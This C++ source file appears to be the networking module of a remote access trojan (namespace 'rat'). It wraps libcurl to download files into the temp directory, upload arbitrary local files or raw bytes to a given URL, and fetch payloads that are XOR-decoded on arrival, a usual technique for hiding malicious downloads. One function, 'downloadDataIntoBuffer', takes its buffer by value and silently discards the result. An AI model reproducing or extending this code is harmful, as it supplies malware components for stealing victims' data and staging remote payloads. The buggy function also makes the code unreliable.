#include "rat/networking.hpp"
#include <fstream>
#include <iostream>

#include "logging.hpp"
namespace rat::networking {

// Internal helper: Write callback for cURL
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    std::vector<char>* buffer = static_cast<std::vector<char>*>(userp);
    size_t totalSize = size * nmemb;
    buffer->insert(buffer->end(), static_cast<char*>(contents), static_cast<char*>(contents) + totalSize);
    return totalSize;
}

// Internal helper: Write callback for FILE*
static size_t WriteFileCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    FILE* fp = static_cast<FILE*>(userp);
    return fwrite(contents, size, nmemb, fp);
}

std::filesystem::path _getFilePathFromUrl(const std::string& arg_Url) {
    std::string filename = arg_Url.substr(arg_Url.find_last_of("/\\") + 1);
    if (filename.empty()) filename = "downloaded_file";
    return std::filesystem::temp_directory_path() / filename;
}

// === Public API ===

NetworkingResponse downloadFile(const std::string& arg_Url, const std::filesystem::path& File_Path) {
    NetworkingResponse response{};
    auto start = std::chrono::steady_clock::now();

    CURL* curl = curl_easy_init();
    if (!curl) {
        response.status = NetworkingResponseStatus::UNKNOWN_FAILURE;
        ERROR_LOG("curl failed to initialize");
        return response;
    }

    FILE* fp = fopen(File_Path.string().c_str(), "wb");
    if (!fp) {
        curl_easy_cleanup(curl);
        ERROR_LOG("Failed to open file for writing");
        response.status = NetworkingResponseStatus::FILE_CREATION_FAILURE;
        return response;
    }

    curl_easy_setopt(curl, CURLOPT_URL, arg_Url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteFileCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);


    CURLcode res = curl_easy_perform(curl);
    fclose(fp);
    curl_easy_cleanup(curl);

    response.duration = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start);

    if (res != CURLE_OK) {
        response.status = NetworkingResponseStatus::CONNECTION_FAILURE;
        return response;
    }

    response.status = NetworkingResponseStatus::SUCCESS;
    return response;
}

NetworkingResponse uploadFile(const std::filesystem::path& File_Path, const std::string& arg_Url) {
    NetworkingResponse response{};
    auto start = std::chrono::steady_clock::now();

    if (!std::filesystem::exists(File_Path)) {
        response.status = NetworkingResponseStatus::FILE_CREATION_FAILURE;
        return response;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        response.status = NetworkingResponseStatus::UNKNOWN_FAILURE;
        return response;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part = curl_mime_addpart(mime);
    curl_mime_filedata(part, File_Path.string().c_str());

    curl_easy_setopt(curl, CURLOPT_URL, arg_Url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    CURLcode res = curl_easy_perform(curl);
    curl_mime_free(mime);
    curl_easy_cleanup(curl);

    response.duration = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start);

    response.status = (res == CURLE_OK) ? NetworkingResponseStatus::SUCCESS
                                        : NetworkingResponseStatus::CONNECTION_FAILURE;
    return response;
}

NetworkingResponse uploadMimeFile(const std::filesystem::path& File_Path,
                                  const std::string& arg_Url,
                                  const std::string& Field_Name,
                                  const std::string& Mime_Type) {
    NetworkingResponse response{};
    if (!std::filesystem::exists(File_Path)) {
        response.status = NetworkingResponseStatus::FILE_CREATION_FAILURE;
        return response;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        response.status = NetworkingResponseStatus::UNKNOWN_FAILURE;
        return response;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part = curl_mime_addpart(mime);
    curl_mime_name(part, Field_Name.c_str());
    curl_mime_filedata(part, File_Path.string().c_str());
    if (!Mime_Type.empty()) {
        curl_mime_type(part, Mime_Type.c_str());
    }

    curl_easy_setopt(curl, CURLOPT_URL, arg_Url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    CURLcode res = curl_easy_perform(curl);
    curl_mime_free(mime);
    curl_easy_cleanup(curl);

    response.status = (res == CURLE_OK) ? NetworkingResponseStatus::SUCCESS
                                        : NetworkingResponseStatus::CONNECTION_FAILURE;
    return response;
}

NetworkingResponse uploadMimeRawBytes(const uint8_t* p_Raw_Bytes, size_t Data_Size,
                                      const std::string& arg_Url, const std::string& Mime_Type) {
    NetworkingResponse response{};
    auto start = std::chrono::steady_clock::now();

    if (!p_Raw_Bytes || Data_Size == 0) {
        response.status = NetworkingResponseStatus::FILE_CREATION_FAILURE;
        return response;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        response.status = NetworkingResponseStatus::UNKNOWN_FAILURE;
        return response;
    }

    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part = curl_mime_addpart(mime);
    curl_mime_data(part, reinterpret_cast<const char*>(p_Raw_Bytes), Data_Size);
    if (!Mime_Type.empty()) {
        curl_mime_type(part, Mime_Type.c_str());
    }

    curl_easy_setopt(curl, CURLOPT_URL, arg_Url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    CURLcode res = curl_easy_perform(curl);
    curl_mime_free(mime);
    curl_easy_cleanup(curl);

    response.duration = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start);

    response.status = (res == CURLE_OK) ? NetworkingResponseStatus::SUCCESS
                                        : NetworkingResponseStatus::CONNECTION_FAILURE;
    return response;
}

std::vector<char> sendHttpRequest(const std::string& arg_Url) {
    std::vector<char> buffer;
    CURL* curl = curl_easy_init();
    if (!curl) return buffer;

    curl_easy_setopt(curl, CURLOPT_URL, arg_Url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) buffer.clear();
    return buffer;
}

size_t sendHttpRequest(const std::string& arg_Url, char* Response_Buffer, size_t Response_Buffer_Size) {
    std::vector<char> tempBuffer = sendHttpRequest(arg_Url);
    size_t copySize = std::min(Response_Buffer_Size, tempBuffer.size());
    if (copySize > 0) {
        std::memcpy(Response_Buffer, tempBuffer.data(), copySize);
    }
    return copySize;
}

bool downloadData(const std::string& arg_Url, std::vector<uint8_t>& Out_Buffer) {
    std::vector<char> temp = sendHttpRequest(arg_Url);
    if (temp.empty()) return false;
    Out_Buffer.assign(temp.begin(), temp.end());
    return true;
}

bool downloadDataIntoBuffer(const std::string& arg_Url, std::vector<uint8_t> Data_Vector) {
    std::vector<char> temp = sendHttpRequest(arg_Url);
    if (temp.empty()) return false;
    Data_Vector.assign(temp.begin(), temp.end());
    return true;
}

bool downloadDataObfuscatedWithXor(const std::string& arg_Url,
                                   std::vector<uint8_t>& Out_Buffer,
                                   const char* Xor_Key) {
    if (!Xor_Key || *Xor_Key == '\0') return false;

    std::vector<char> temp = sendHttpRequest(arg_Url);
    if (temp.empty()) return false;

    size_t keyLen = std::strlen(Xor_Key);
    Out_Buffer.resize(temp.size());
    for (size_t i = 0; i < temp.size(); ++i) {
        Out_Buffer[i] = static_cast<uint8_t>(temp[i] ^ Xor_Key[i % keyLen]);
    }
    return true;
}

} // namespace rat::networking
